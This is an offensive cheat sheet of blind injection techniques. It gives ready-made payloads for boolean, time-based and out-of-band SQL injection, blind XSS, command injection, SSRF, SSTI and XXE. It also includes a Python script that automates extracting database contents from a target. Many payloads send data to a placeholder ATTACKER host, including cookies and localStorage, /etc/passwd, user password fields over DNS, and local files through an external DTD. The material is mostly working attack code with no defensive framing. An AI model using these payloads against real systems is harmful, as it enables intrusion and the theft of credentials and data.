# Blind Injection Techniques

## Blind SQL Injection

### Boolean-Based Blind
```sql
-- Determine if injectable
' AND 1=1--  (true → normal response)
' AND 1=2--  (false → different response)

-- Extract database version length
' AND LENGTH(version())>5--
' AND LENGTH(version())=10--

-- Extract characters one by one
' AND SUBSTRING(version(),1,1)='5'--
' AND SUBSTRING(version(),1,1)>'4'--

-- Binary search for each character (efficient)
' AND ASCII(SUBSTRING(version(),1,1))>64--   → narrow range
' AND ASCII(SUBSTRING(version(),1,1))>96--
' AND ASCII(SUBSTRING(version(),1,1))>112--
-- Average: ~7 requests per character (log2(128))

-- Extract database name
' AND SUBSTRING(database(),1,1)='a'--

-- Extract table names
' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u'--

-- Extract data
' AND SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)='a'--
```

### Time-Based Blind
```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(version(),1,1)='5',SLEEP(5),0)--

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
'; SELECT CASE WHEN (SUBSTRING(version(),1,1)='P') THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--
'; IF (SUBSTRING(@@version,1,1)='M') WAITFOR DELAY '0:0:5'--

-- SQLite
' AND CASE WHEN 1=1 THEN randomblob(500000000) ELSE 0 END--

-- Oracle
' AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)='x'--
```

### Out-of-Band (OOB) Extraction
```sql
-- MySQL (requires FILE privilege)
SELECT LOAD_FILE(CONCAT('\\\\',version(),'.ATTACKER_DOMAIN\\a'));

-- MSSQL (DNS exfiltration)
'; DECLARE @q VARCHAR(1024); SET @q='\\' + (SELECT TOP 1 password FROM users) + '.ATTACKER_DOMAIN\\a'; EXEC master..xp_dirtree @q;--

-- PostgreSQL
'; COPY (SELECT version()) TO PROGRAM 'curl http://ATTACKER/?d=$(cat /etc/hostname)';--

-- Oracle
SELECT UTL_HTTP.REQUEST('http://ATTACKER/?d='||version) FROM dual;
```

### Automated Extraction Script
```python
import requests

URL = "http://TARGET/page"
TRUE_INDICATOR = "Welcome"  # string present in true response

def blind_extract(query, max_len=100):
    """Extract string via boolean-based blind SQLi."""
    result = ""
    for pos in range(1, max_len + 1):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            # Binary search
            payload = f"' AND ASCII(SUBSTRING(({query}),{pos},1))>{mid}--"
            r = requests.get(URL, params={"id": payload})
            if TRUE_INDICATOR in r.text:
                low = mid + 1
            else:
                high = mid - 1
        if low > 126:  # end of string
            break
        result += chr(low)
        print(f"[+] Position {pos}: {result}")
    return result

# Usage
db_name = blind_extract("SELECT database()")
tables = blind_extract("SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()")
```

## Blind XSS

```html
<!-- Payloads that call back when triggered (e.g., in admin panels, logs) -->
<script src=https://ATTACKER/hook.js></script>
"><script src=https://ATTACKER/xss.js></script>
<img src=x onerror="fetch('https://ATTACKER/blind?c='+document.cookie)">

<!-- XSS Hunter style (captures page content + cookies + URL) -->
<script>
fetch('https://ATTACKER/capture', {
  method: 'POST',
  body: JSON.stringify({
    url: location.href,
    cookie: document.cookie,
    dom: document.documentElement.innerHTML.substring(0, 2000),
    localStorage: JSON.stringify(localStorage)
  })
});
</script>

<!-- Polyglot (works in multiple contexts) -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//
```

## Blind Command Injection

```bash
# Time-based
; sleep 5
| sleep 5
$(sleep 5)
`sleep 5`

# OOB — DNS
; nslookup ATTACKER_DOMAIN
; nslookup $(whoami).ATTACKER_DOMAIN
; ping -c 1 $(whoami).ATTACKER_DOMAIN

# OOB — HTTP
; curl http://ATTACKER/$(whoami)
; wget http://ATTACKER/$(id|base64)
| curl http://ATTACKER -d @/etc/passwd

# File write (then retrieve via LFI or web)
; id > /var/www/html/output.txt
; cat /etc/passwd > /tmp/out && curl -d @/tmp/out http://ATTACKER
```

## Blind SSRF

```
# Time-based (internal port scan)
# Request to open port → fast response
# Request to closed port → timeout (slow response)
# → Measure response time to map internal ports

# OOB — DNS
http://ATTACKER_DOMAIN  → check DNS logs
http://$(hostname).ATTACKER_DOMAIN

# OOB — HTTP
http://ATTACKER:PORT/ssrf-confirm  → check HTTP server logs

# Blind cloud metadata extraction
# Chain with redirect: http://ATTACKER/redirect → http://169.254.169.254/...
```

## Blind SSTI

```
# Time-based detection
# Jinja2: {{request.application.__globals__.__builtins__.__import__('time').sleep(5)}}
# Twig: {{'/bin/sleep 5'|filter('system')}}

# OOB
# Jinja2: {{request.application.__globals__.__builtins__.__import__('os').popen('curl http://ATTACKER/$(id)').read()}}
# If output not visible, use OOB to extract data

# Math-based detection (no output needed, check side effects)
{{7*7*7*7*7*7*7*7*7*7}}  → if server is slow = heavy computation = injectable
```

## Blind XXE

```xml
<!-- OOB via external DTD -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd">
  %xxe;
]>
<data>test</data>

<!-- evil.dtd on attacker server: -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?d=%file;'>">
%eval;
%exfil;

<!-- Error-based XXE (extract via error messages) -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

## Performance Optimization

```
# Binary search: ~7 requests per character (vs 95 for linear)
# Bisection on ASCII range [32-126]:
#   Request 1: >79? → narrow to [80-126] or [32-79]
#   Request 2: >103 or >55? → narrow further
#   ... ~7 requests to pinpoint character

# Parallelization: extract multiple positions simultaneously
# Use threading (10-20 threads) on different character positions

# Charset optimization (try common chars first):
# For passwords: etaoinshrdlcumwfgypbvkjxqz0123456789
# For hex hashes: 0123456789abcdef
# For emails: etaoinshrdlcumwfgypbvkjxqz@._0123456789

# Conditional responses: track response length, status code, or specific strings
```
